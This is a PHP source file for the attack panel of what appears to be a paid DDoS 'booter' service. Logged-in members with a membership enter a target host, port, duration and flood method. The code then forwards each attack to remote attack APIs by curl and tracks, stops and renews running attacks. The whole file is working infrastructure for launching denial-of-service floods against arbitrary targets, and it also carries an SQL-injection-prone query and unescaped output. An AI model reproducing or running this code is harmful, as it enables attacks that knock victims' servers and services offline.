<?php
ob_start();
include 'controls/database.php';
if (!($user -> LoggedIn()))
{
	header('location: login.php');
	die();
}
if (!($user -> notBanned($odb)))
{
	header('location: login.php');
	die();
}
if (!($user->hasMembership($odb)))
{
	header('location: purchase.php');
	die();
}
$page = "Booter";
include ("head.php");
?>
<body>
		<?php include "header.php"; ?>
	
		<div class="container-fluid content">
		<div class="row">
				
			<?php include "side.php"; ?>
			<!-- end: Main Menu -->
						
			<!-- start: Content -->


                                       





                     <div class="col-md-10 col-sm-11 main ">


			<div class="row">
				<?php
				  $SQLSelect = $odb -> query("SELECT * FROM `api` ORDER BY `ID` ASC");
				  while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
				  {
					$rowID = $show['ID'];
				?>
				<?php
				  }
				  ?>
				<div class="col-lg-3 col-sm-6 col-xs-6 col-xxs-12">
					<div class="smallstat">
						<div class="boxchart-overlay blue">
							<div class="boxchart">5,6,7,2,0,4,2,4,8,2,3,3,2</div>
						</div>
						<span class="value"><?php echo $rowID ?></span>	
						<span class="title">Total Servers Online</span>
							
					</div>
				</div><!--/col-->
				<div class="col-lg-3 col-sm-6 col-xs-6 col-xxs-12">
					<div class="smallstat">
						<i class="fa fa-laptop darkGreen"></i>
						<span class="value"><?php echo $stats -> totalUsers($odb); ?></span>	
						<span class="title">New Members</span>						
					</div>
				</div><!--/col-->

				<div class="col-lg-3 col-sm-6 col-xs-6 col-xxs-12">
					<div class="smallstat">
						<div class="linechart-overlay green">
							<div class="linechart">1,2,6,4,0,8,2,4,5,3,1,7,5</div>
						</div>
						<span class="value"><?php echo $stats -> totalBoots($odb); ?></span>	
						<span class="title">Total Stress</span>						
					</div>
				</div><!--/col-->
				
				<div class="col-lg-3 col-sm-6 col-xs-6 col-xxs-12">
					<div class="smallstat">
						<div class="boxchart-overlay blue">
							<div class="boxchart">1,2,3,4,2,8,2,7,8,2,3,5,2</div>
						</div>
						<span class="value"><?php echo $stats -> runningBoots($odb); ?>/<?php echo $maxBootSlots;?></span>	
						<span class="title">Running Attacks</span>						
					</div>









				</div><!--/col-->

			</div><!--/row-->





			<div class="row">
			<div class="col-md-4">
			<?php
				if (isset($_POST['attackBtn']))
				{
					if ($stats->runningBoots($odb) < $maxBootSlots) {
					$host = $_POST['host'];
					$port = intval($_POST['port']);
					$time = intval($_POST['time']);
					$method = $_POST['method'];
					if (empty($host) || empty($time) || empty($port) || empty($method))
					{
						echo '<div class="g_12"><div class="alert alert-danger"><strong>ERROR</strong>: Please Fill In All Fields</div></div>';
					}
					else
					{
						if (!filter_var($host, FILTER_VALIDATE_IP) && !filter_var($host, FILTER_VALIDATE_URL))
						{
							echo '<div class="g_12"><div class="alert alert-danger"><strong>ERROR</strong>: Invalid Host</div></div>';
						}
						else
						{
							$SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
							$SQLCheckBlacklist -> execute(array(':host' => $host));
							$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
							if ($countBlacklist > 0)
							{
								echo '<div class="g_12"><div class="alert alert-danger"><strong>ERROR</strong>: IP is blacklisted</div></div>';
							}
							else
							{
								$checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
								$checkRunningSQL -> execute(array(':username' => $_SESSION['username']));
								$countRunning = $checkRunningSQL -> fetchColumn(0);
								if (!($countRunning >= $stats -> con($odb, $_SESSION['username'])))
								{
									$SQLGetTime = $odb -> prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
									$SQLGetTime -> execute(array(':id' => $_SESSION['ID']));
									$maxTime = $SQLGetTime -> fetchColumn(0);
									if (!($time > $maxTime))
									{
										$insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES (NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0')");
										$insertLogSQL -> execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method));
										$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` ORDER BY RAND () LIMIT 1");
										while ($show = $SQLSelectAPI -> fetch(PDO::FETCH_ASSOC))
										{
											$arrayFind = array('[host]', '[port]', '[time]', '[method]');
											$arrayReplace = array($host, $port, $time, $method);
											$APILink = $show['api'];
											$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
											$ch = curl_init();
											curl_setopt($ch, CURLOPT_URL, $APILink);
											curl_setopt($ch, CURLOPT_HEADER, 0);
											curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
											curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
											curl_setopt($ch, CURLOPT_TIMEOUT, 3);
											curl_exec($ch);
											curl_close($ch);
										}
									    echo '<div class="g_12"><div class="alert alert-success"><strong>SUCCESS</strong>: Attack has been sent to '.$host.':'.$port.' for '.$time.' seconds using '.$method.'</div></div>';
									}
									else
									{
										echo '<div class="g_12"><div class="alert alert-danger"><strong>ERROR</strong>: Your max boot time is '.$maxTime.'</div></div>';
									}
								}
								else
								{
									echo '<div class="g_12"><div class="alert alert-danger"><strong>ERROR</strong>: You currently have a boot running.  Please wait for it to be over.</div<</div>';
								}
							}
						}
					}
					} else {
						echo '<div class="g_12"><div class="alert alert-danger"><strong>ERROR</strong>: Maximum amount of boot slots taken</div></div>';
					}
				}
				?>





					<div class="panel panel-default">
			            <div class="panel-heading">
			                <h2><strong>Booter</strong></h2>
			            </div>
			            <div class="panel-body">
							<form action="" method="POST" class="form-horizontal">
								<div class="form-group">
				                    <div class="col-sm-12">
				                        <input type="text" class="form-control" name="host" placeholder="Target">
				                    </div>
				                </div>
								<div class="form-group">
				                    <div class="col-sm-12">
				                        <input type="text" class="form-control" name="port" placeholder="Port">
				                    </div>
				                </div>
								<div class="form-group">
				                    <div class="col-sm-12">
				                        <input type="text" class="form-control" name="time" placeholder="Seconds">
				                    </div>
				                </div>
								<div class="form-group">
				                    <div class="col-sm-12">
				                     <select name="method" class="form-control">
										<?php
										   $SQLSelect = $odb -> query("SELECT * FROM `methods` ORDER BY `ID` ASC");
											while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
											{
												$nameShow = $show['name'];
												$friendlyShow = $show['friendly'];
												echo "<option value=\"" . $nameShow . "\">" . $friendlyShow . "</option>" . PHP_EOL;
											}
										?>
									</select>
				                    </div>
				                </div>
						</div>
						<div class="panel-footer">
							<button type="submit" name="attackBtn" class="btn btn-sm btn-success"><i class="fa fa-flash"></i> Launch Flood</button>
						</div>	
						</form>
			        </div>
				</div>
					<div class="col-lg-8">
					<form method="POST">
					<?php
								if (isset($_POST['stopbtn']))
								{
									$stops = $_POST['stopCheck'];
									foreach($stops as $stop)
									{
										$SQL = $odb -> prepare("UPDATE `logs` SET `stopped` = 1 WHERE `id` = :id LIMIT 1");
										$SQL -> execute(array(':id' => $stop));
											$SQLSelect = $odb -> prepare("SELECT * FROM `logs` WHERE `id` = :id LIMIT 1");
											$SQLSelect -> execute(array(':id' => $stop));
											while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
											{
												$host = $show['ip'];
												$port = $show['port'];
												$time = $show['time'];
												$method = $show['method'];
												}
												$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` ORDER BY `id` DESC");
												while ($show = $SQLSelectAPI -> fetch(PDO::FETCH_ASSOC))
												{
												$arrayFind = array('[host]', '[port]', '[time]', '[method]');
												$arrayReplace = array($host, $port, $time, $method);
												$APILink = $show['api'];
												$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
												$stopcommand = "&method=stop";
												$stopapi = $APILink . $stopcommand;
													$ch = curl_init();
													curl_setopt($ch, CURLOPT_URL, $stopapi);
													curl_setopt($ch, CURLOPT_HEADER, 0);
													curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
													curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
													curl_setopt($ch, CURLOPT_TIMEOUT, 3);
													curl_exec($ch);
													curl_close($ch);
											}
											echo '<div class="g_12"><div class="alert alert-success"><strong>SUCCESS</strong>: Attack(s) Have Been Stopped!</div></div>';
									}
								}
								?>
					<div class="panel panel-default">
						<div class="panel-heading">
							<h2><i class="fa fa-refresh"></i><span class="break"></span>Manage Attacks</h2>
						</div>
						<div class="panel-body">
							<table class="table table-striped">
								  <thead>
									  <tr>
										<th>#</th>
										<th>Host</th>
										<th>Time Left</th>
										<th>Method</th>
										<th>Status</th>
										<th>Action</th>
									</tr>
								</thead>
								<tbody>
									<?php
									$SQLSelect = $odb -> query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}'  AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 ORDER BY `id` DESC");
									while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
									{
									$ip = $show['ip'];
									$port = $show['port'];
									$time = $show['time'];
									$method = $show['method'];
									$rowID = $show['id'];
									echo '<tr><td><input type="checkbox" name="stopCheck[]" value="'.$rowID.'"/></td><td>'.$ip.'</td><td>';
										
									//echo date("r", ($show['time'] + $show['date'])) . "<br />";
										
									?>
									<div id='att-<?php echo $rowID; ?>'></div>
									<script>
									var i<?php echo $rowID; ?> = <?php echo abs(time() - ($show['date'] + $show['time'])); ?>;
									var time<?php echo $rowID; ?> = setInterval(function(){
										document.getElementById("att-<?php echo $rowID; ?>").innerHTML="Attack ending in "+(i<?php echo $rowID; ?>--)+" seconds"
										if (i<?php echo $rowID; ?> == 0){
											clearInterval(time<?php echo $rowID; ?>);
											document.getElementById("att-<?php echo $rowID; ?>").innerHTML="Attack Finished!"
										}
									},1000);
									</script>
									<?php echo '</td><td>'.$method.'</td><td><span class="label label-success">Running</span></td><td><input type="submit" name="stopbtn" value="Stop" class="btn btn-danger" /></td></tr>';
									}
									$SQLSelectRunningAttack = $odb -> prepare("SELECT * FROM `logs` WHERE user= :user AND (`time` + `date` < UNIX_TIMESTAMP() OR `stopped` != 'No') ORDER BY `ID` DESC LIMIT 5;");
									   $SQLSelectRunningAttack->execute(array(":user" => $_SESSION['username']));
										if ($SQLSelectRunningAttack->rowCount() != 0) {
									  while ($show = $SQLSelectRunningAttack -> fetch(PDO::FETCH_ASSOC))
									  {
										$ip = htmlentities($show['ip']);
										$port = htmlentities($show['port']);
										$time = htmlentities($show['time']);
										$method = htmlentities($show['method']);
										$rowID = htmlentities($show['ID']);
										echo '<tr class="spacer"></tr><tr><td>'.$rowID.'</td><td>'.$ip.'</td><td>'.$time.'</td><td>'.$method.'</td><td><span class="label label-warning">Restart</span></td><td><form method="post" action="">
											<div class="g_10"><button type="submit" name="attackBtn" class="btn btn-success">Renew</button>
													<input name="host" type="hidden" value="' . $ip . '"/>
													<input name="port" type="hidden" value="' . $port . '"/>
													<input name="time" type="hidden" value="' . $time . '"/>
													<input name="method" type="hidden" value="' . $method . '"/>
											</div></form></td></tr>
												'; 
									  } }
									  
									  else {
										echo "<tr class=\"spacer\"></tr><tr><td colspan='6'>You have no previous boots</td></tr>";
									  }
									 ?>
								</tbody>
							 </table>     
						</div>
					   </form>
					</div>
				</div>
			</div><!--/row-->




		</div>
	</div>
	<div class="clearfix"></div>
	
	<?php include "footer.php"; ?>
		
	<!-- start: JavaScript-->
	<!--[if !IE]>-->

			<script src="assets/js/jquery-2.1.0.min.js"></script>

	<!--<![endif]-->

	<!--[if IE]>
	
		<script src="assets/js/jquery-1.11.0.min.js"></script>
	
	<![endif]-->

	<!--[if !IE]>-->

		<script type="text/javascript">
			window.jQuery || document.write("<script src='assets/js/jquery-2.1.0.min.js'>"+"<"+"/script>");
		</script>

	<!--<![endif]-->

	<!--[if IE]>
	
		<script type="text/javascript">
	 	window.jQuery || document.write("<script src='assets/js/jquery-1.11.0.min.js'>"+"<"+"/script>");
		</script>
		
	<![endif]-->
	<script src="assets/js/jquery-migrate-1.2.1.min.js"></script>
	<script src="assets/js/bootstrap.min.js"></script>	
	
	
	<!-- page scripts -->
	<script src="assets/js/jquery-ui.min.js"></script>
	<script src="assets/js/jquery.ui.touch-punch.min.js"></script>
	<script src="assets/js/jquery.sparkline.min.js"></script>
	<script src="assets/js/fullcalendar.min.js"></script>
	<!--[if lte IE 8]><script language="javascript" type="text/javascript" src="assets/js/excanvas.min.js"></script><![endif]-->
	<script src="assets/js/jquery.flot.min.js"></script>
	<script src="assets/js/jquery.flot.pie.min.js"></script>
	<script src="assets/js/jquery.flot.stack.min.js"></script>
	<script src="assets/js/jquery.flot.resize.min.js"></script>
	<script src="assets/js/jquery.flot.time.min.js"></script>
	<script src="assets/js/jquery.flot.spline.min.js"></script>
	<script src="assets/js/jquery.autosize.min.js"></script>
	<script src="assets/js/jquery.placeholder.min.js"></script>
	<script src="assets/js/moment.min.js"></script>
	<script src="assets/js/daterangepicker.min.js"></script>
	<script src="assets/js/jquery.easy-pie-chart.min.js"></script>
	<script src="assets/js/jquery.dataTables.min.js"></script>
	<script src="assets/js/dataTables.bootstrap.min.js"></script>
	<script src="assets/js/raphael.min.js"></script>
	<script src="assets/js/morris.min.js"></script>
	<script src="assets/js/jquery-jvectormap-1.2.2.min.js"></script>
	<script src="assets/js/uncompressed/jquery-jvectormap-world-mill-en.js"></script>
	<script src="assets/js/uncompressed/gdp-data.js"></script>
	<script src="assets/js/gauge.min.js"></script>
	
	<!-- theme scripts -->
	<script src="assets/js/custom.min.js"></script>
	<script src="assets/js/core.min.js"></script>
	
	<!-- inline scripts related to this page -->
	<script src="assets/js/pages/index.js"></script>
	
	<!-- end: JavaScript-->
	<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/57b8ab1c0934485f5bf65f95/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script-->
</body>
</html>